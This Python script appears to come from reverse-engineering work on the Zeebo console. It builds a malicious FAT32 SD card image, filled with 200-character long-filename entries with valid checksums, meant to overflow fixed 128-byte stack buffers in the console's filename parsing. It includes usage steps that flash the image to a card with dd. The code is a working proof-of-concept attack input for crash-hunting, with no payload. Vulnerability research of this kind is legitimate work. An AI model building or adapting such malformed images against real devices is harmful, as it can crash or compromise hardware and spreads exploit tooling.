#!/usr/bin/env python3
"""Build a malicious FAT32 SD image for Zeebo LFN crash-hunting (UNTESTED).

!!! DO NOT RUN in shared/important environments. Builds a .img FILE ONLY;
!!! flashing it to a real SD (dd) must be done by the operator elsewhere.
!!! Worst case on console: bootloop while the SD is inserted (remove it).

Theory (re/notes.md sections 20/25): unbounded strcpy/strcat of filenames
into 128B stack buffers (proven with firmware bytes under Unicorn) +
CVE-2026-6688 LFN pattern. This image plants 200-char LFN entries where
the console parses SD names (root, /mif, /mod/<app>/, trigger .dat).

Layout (valid 8.3 aliases + correct LFN checksums throughout):
  /61u.key                                   (14xA; --no-key to omit)
  /longcheerzeebo/autocopysdcardinfotoenand.dat   (empty trigger)
  /mif/<200-char>.mif                        (zeros)
  /mif/GOOD.mif                              (control)
  /mod/<200-char>/                            (dir)
  /mod/<200-char>/<200-char>.mod              (zeros)
  /mod/GOODAPP/GOOD.mod                      (control)
  /<200-char>/                                (dir, hotplug-scan bait)
  /<200-char>.txt                             (zeros)

Usage (ELSEWHERE, not here):
  python3 make_evil_sd.py --out evil.raw --format raw [--size-mb 64]
      [--name-len 200] [--no-key]
  python3 make_evil_sd.py --verify evil.raw     # re-parse + report, no flashing
  sudo dd if=evil.raw of=/dev/sdX bs=4M status=progress; sync

Then: insert into LOCKED Zeebo (off), power on, observe 5+ min
(LED freeze? reboot loop? silence where logs were? installs?).
REMOVE SD to recover from any bootloop.
Report back: behavior + exact image options used.

For emulator/RE testing (unicorn/zeebo-lle/capstone), the .raw is a plain
sector dump: parse with --verify, feed clusters to Unicorn, or mount LOOP
READ-ONLY elsewhere (never read-write: a live kernel would replay logs).
"""

import argparse
import struct
import sys

SECTOR = 512


def lfn_checksum(alias11: bytes) -> int:
    s = 0
    for c in alias11:
        s = (((s & 1) << 7) + (s >> 1) + c) & 0xFF
    return s


def alias_for(longname: str, counter: int) -> bytes:
    base, _, ext = longname.rpartition(".")
    clean = lambda s: "".join(c.upper() if c.isalnum() else "_" for c in s)
    stem = (clean(base)[:6] + f"~{counter}")[:8].ljust(8)
    return (stem + clean(ext)[:3].ljust(3)).encode("ascii")


def lfn_entries(longname: str, alias11: bytes):
    units = [ord(c) for c in longname] + [0x0000]
    n = (len(units) + 12) // 13
    units += [0xFFFF] * (n * 13 - len(units))
    chk = lfn_checksum(alias11)
    out = []
    for i in range(n - 1, -1, -1):
        seq = (i + 1) | (0x40 if i == n - 1 else 0)
        chunk = units[i * 13:(i + 1) * 13]
        e = bytearray(32)
        e[0] = seq
        e[11] = 0x0F
        e[13] = chk
        e[1:11] = struct.pack("<5H", *chunk[0:5])
        e[14:26] = struct.pack("<6H", *chunk[5:11])
        e[28:32] = struct.pack("<2H", *chunk[11:13])
        out.append(bytes(e))
    return out


def short_entry(alias11: bytes, attr: int, cluster: int, size: int) -> bytes:
    e = bytearray(32)
    e[0:11] = alias11
    e[11] = attr
    e[20:22] = struct.pack("<H", (cluster >> 16) & 0xFFFF)
    e[26:28] = struct.pack("<H", cluster & 0xFFFF)
    e[28:32] = struct.pack("<I", size)
    return bytes(e)


class Image:
    """FAT32 image. Cluster 2 is reserved for root at construction."""

    def __init__(self, size_mb: int, spc: int = 4, reserved: int = 32):
        self.total = size_mb * 1024 * 1024 // SECTOR
        self.spc = spc
        self.reserved = reserved
        fat = 256
        for _ in range(3):
            clusters = (self.total - reserved - 2 * fat) // spc
            fat = (clusters * 4 + SECTOR - 1) // SECTOR
        self.fat_sectors = fat
        self.data_start = reserved + 2 * fat
        self.nclusters = (self.total - self.data_start) // spc
        self.buf = bytearray(self.total * SECTOR)
        self.fat = [0] * (self.nclusters + 2)
        self.fat[0] = 0x0FFFFFF8
        self.fat[1] = 0x0FFFFFFF
        self.fat[2] = 0x0FFFFFFF  # root dir
        self.next_free = 3
        self.dirs = {}  # cluster -> entries bytearray
        self.counter = [1]

    def alloc_chain(self, nsec: int) -> int:
        start = self.next_free
        for _ in range(nsec):
            self.fat[self.next_free] = self.next_free + 1
            self.next_free += 1
        self.fat[self.next_free - 1] = 0x0FFFFFFF
        return start

    def clus_off(self, c: int) -> int:
        return (self.data_start + (c - 2) * self.spc) * SECTOR

    def write_chain(self, start: int, data: bytes):
        c, off = start, 0
        while True:
            chunk = data[off:off + self.spc * SECTOR]
            self.buf[self.clus_off(c):self.clus_off(c) + len(chunk)] = chunk
            off += self.spc * SECTOR
            if off >= len(data):
                break
            nxt = self.fat[c]
            assert nxt < 0x0FFFFFF8, "chain too short — extend first"
            c = nxt

    def extend(self, start: int, nsec: int):
        """Ensure chain at `start` spans >= nsec clusters."""
        have, cc, last = 0, start, start
        while True:
            have += 1
            nxt = self.fat[cc]
            if nxt >= 0x0FFFFFF8:
                last = cc
                break
            cc = nxt
        while have < nsec:
            self.fat[last] = self.next_free
            last = self.next_free
            self.next_free += 1
            have += 1
        self.fat[last] = 0x0FFFFFFF

    def add(self, parent: bytearray, name: str, is_dir: bool, content: bytes = b"") -> int:
        """Append LFN+short entries to parent; return data cluster (0 for empty files)."""
        if not content and not is_dir:
            start = 0
        else:
            nsec = max(1, (len(content) + self.spc * SECTOR - 1) // (self.spc * SECTOR))
            start = self.alloc_chain(nsec)
            if content:
                self.write_chain(start, content)
        if is_dir:
            self.dirs[start] = bytearray(
                short_entry(b".          ", 0x10, start, 0)
                + short_entry(b"..         ", 0x10, 0, 0))
        alias = alias_for(name, self.counter[0])
        self.counter[0] += 1
        for e in lfn_entries(name, alias):
            parent += e
        parent += short_entry(alias, 0x10 if is_dir else 0x20, start, len(content))
        return start

    def finalize(self, root: bytearray) -> bytes:
        nsec = max(1, (len(root) + self.spc * SECTOR - 1) // (self.spc * SECTOR))
        self.extend(2, nsec)  # root lives at cluster 2
        self.write_chain(2, bytes(root))
        for c, data in self.dirs.items():
            nsec = max(1, (len(data) + self.spc * SECTOR - 1) // (self.spc * SECTOR))
            self.extend(c, nsec)
            self.write_chain(c, bytes(data))
        fatbin = struct.pack(f"<{len(self.fat)}I", *self.fat)
        fatbin = fatbin[:self.fat_sectors * SECTOR].ljust(self.fat_sectors * SECTOR, b"\x00")
        for i in range(2):
            o = (self.reserved + i * self.fat_sectors) * SECTOR
            self.buf[o:o + len(fatbin)] = fatbin
        bs = bytearray(SECTOR)
        bs[0:3] = b"\xeb\x58\x90"
        bs[3:11] = b"ZEEBOEIL "
        struct.pack_into("<H", bs, 11, SECTOR)
        bs[13] = self.spc
        struct.pack_into("<H", bs, 14, self.reserved)
        bs[16] = 2
        bs[21] = 0xF8
        struct.pack_into("<H", bs, 24, 63)
        struct.pack_into("<H", bs, 26, 255)
        struct.pack_into("<I", bs, 28, 32)
        struct.pack_into("<I", bs, 32, self.total - 32)
        struct.pack_into("<I", bs, 36, self.fat_sectors)
        struct.pack_into("<I", bs, 44, 2)
        struct.pack_into("<H", bs, 48, 1)
        struct.pack_into("<H", bs, 50, 6)
        bs[64] = 0x80
        bs[66] = 0x29
        struct.pack_into("<I", bs, 67, 0x6BEEF00D)
        bs[71:82] = b"ZEEBOEVIL  "
        bs[82:90] = b"FAT32   "
        bs[510:512] = b"\x55\xaa"
        self.buf[32 * SECTOR:33 * SECTOR] = bs
        fi = bytearray(SECTOR)
        fi[0:4] = b"RRaA"
        fi[484:488] = b"rrAa"
        struct.pack_into("<I", fi, 488, self.nclusters - self.next_free)
        struct.pack_into("<I", fi, 492, self.next_free)
        fi[510:512] = b"\x55\xaa"
        self.buf[33 * SECTOR:34 * SECTOR] = fi
        mbr = bytearray(SECTOR)
        struct.pack_into("<I", mbr, 446 + 8, 32)
        struct.pack_into("<I", mbr, 446 + 12, self.total - 32)
        mbr[446 + 4] = 0x0C
        mbr[510:512] = b"\x55\xaa"
        self.buf[0:SECTOR] = mbr
        return bytes(self.buf)


def build(args) -> bytes:
    img = Image(args.size_mb)
    root = bytearray()
    ln = "A" * args.name_len
    if not args.no_key:
        key = img.alloc_chain(1)
        img.write_chain(key, b"A" * 14)
        root += short_entry(b"61U     KEY", 0x20, key, 14)
    mif = img.add(root, "mif", True)
    img.add(img.dirs[mif], ln + ".mif", False, b"\x00" * 64)
    img.add(img.dirs[mif], "GOOD.mif", False, b"\x00" * 64)
    mod = img.add(root, "mod", True)
    app = img.add(img.dirs[mod], ln, True)
    img.add(img.dirs[app], ln + ".mod", False, b"\x00" * 64)
    good = img.add(img.dirs[mod], "GOODAPP", True)
    img.add(img.dirs[good], "GOOD.mod", False, b"\x00" * 64)
    lz = img.add(root, "longcheerzeebo", True)
    img.add(img.dirs[lz], "autocopysdcardinfotoenand.dat", False, b"")
    img.add(root, ln, True)                      # root-level long dir
    img.add(root, ln + ".txt", False, b"\x00" * 64)
    return img.finalize(root)


def verify(path: str) -> int:
    """Re-parse a .raw image: MBR, boot sector, FAT chains, LFN checksums.
    Read-only structural check. Returns 0 if clean, 1 with diagnostics."""
    data = open(path, "rb").read()
    errs = []

    def err(msg):
        errs.append(msg)
        print(f"  BAD: {msg}")

    def walk(c, fat):
        while c < 0x0FFFFFF8:
            yield c
            c = fat[c]

    def chain_ok(c, fat):
        seen, n = set(), 0
        while c < 0x0FFFFFF8:
            if c in seen or c < 2:
                return False
            seen.add(c)
            c = fat[c]
            n += 1
            if n > 10 ** 6:
                return False
        return True

    if len(data) % SECTOR:
        err("size not multiple of 512")
    if data[510:512] != b"\x55\xaa":
        err("MBR signature missing")
    ptype = data[446 + 4]
    start = struct.unpack("<I", data[446 + 8:446 + 12])[0]
    print(f"  MBR: type={ptype:#x} start={start}")
    if ptype != 0x0C:
        err("partition type != 0x0C (FAT32 LBA)")
    boot = data[start * SECTOR:start * SECTOR + SECTOR]
    if boot[510:512] != b"\x55\xaa":
        err("VBR signature missing")
    bps, spc, rsv, fats = struct.unpack("<HHH B", boot[11:17])
    fsz = struct.unpack("<I", boot[36:40])[0]
    root = struct.unpack("<I", boot[44:48])[0]
    print(f"  VBR: bps={bps} spc={spc} reserved={rsv} fats={fats} "
          f"fat_sectors={fsz} root_cluster={root}")
    if (bps, spc, fats, root) != (512, 4, 2, 2):
        err("unexpected geometry (want 512/4/2/root=2)")
    dstart = start + rsv + 2 * fsz
    fatraw = data[(start + rsv) * SECTOR:(start + rsv) * SECTOR + fsz * SECTOR]
    fat = struct.unpack(f"<{len(fatraw) // 4}I", fatraw)

    def entries_at(c):
        raw = b"".join(
            data[(dstart + (cc - 2) * spc) * SECTOR:
                 (dstart + (cc - 2) * spc + spc) * SECTOR]
            for cc in walk(c, fat))
        out = []
        for i in range(0, len(raw), 32):
            e = raw[i:i + 32]
            if len(e) < 32 or e[0] == 0x00:
                break
            if e[0] == 0xE5:
                continue
            out.append(e)
        return out

    files = []
    pending = []

    def walkdir(c, prefix):
        for e in entries_at(c):
            if e[11] == 0x0F:
                pending.append(e)
                continue
            name11, attr = e[0:11], e[11]
            clus = struct.unpack("<H", e[26:28])[0] | (struct.unpack("<H", e[20:22])[0] << 16)
            size = struct.unpack("<I", e[28:32])[0]
            if pending:
                seqs = [x[0] & 0x1F for x in pending]
                if seqs != list(range(len(pending), 0, -1)):
                    err(f"{prefix}: LFN sequence broken {seqs}")
                if pending[0][13] != lfn_checksum(name11):
                    err(f"{prefix}: LFN checksum mismatch")
                pending.clear()
            label = name11.decode("ascii", "replace")
            files.append((prefix + label, attr, clus, size))
            if attr & 0x10 and clus >= 2 and name11 not in (b".          ", b"..         "):
                walkdir(clus, prefix + label.strip() + "/")

    walkdir(2, "/")
    print(f"  files+dirs: {len(files)}")
    for name, attr, clus, size in files[:40]:
        kind = "DIR " if attr & 0x10 else "file"
        print(f"    {kind} {name} clus={clus} size={size}")
        if not (attr & 0x10) and size > 0 and not chain_ok(clus, fat):
            err(f"{name}: broken FAT chain")
    if errs:
        print(f"VERIFY FAILED ({len(errs)} problems)")
        return 1
    print("VERIFY OK")
    return 0


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--out")
    ap.add_argument("--format", choices=["raw"], default="raw")
    ap.add_argument("--size-mb", type=int, default=64)
    ap.add_argument("--name-len", type=int, default=200)
    ap.add_argument("--no-key", action="store_true")
    ap.add_argument("--verify", metavar="IMAGE")
    args = ap.parse_args()
    if args.verify:
        sys.exit(verify(args.verify))
    if not args.out:
        sys.exit("--out required (or use --verify IMAGE)")
    if not args.out.endswith((".raw", ".img")):
        print("warning: suggest .raw extension for dd/emulator use")
    if not (1 <= args.name_len <= 255):
        sys.exit("name-len must be 1..255")
    if args.size_mb < 8:
        sys.exit("size-mb must be >= 8")
    with open(args.out, "wb") as f:
        f.write(build(args))
    print(f"wrote {args.out} ({args.format})")


if __name__ == "__main__":
    main()
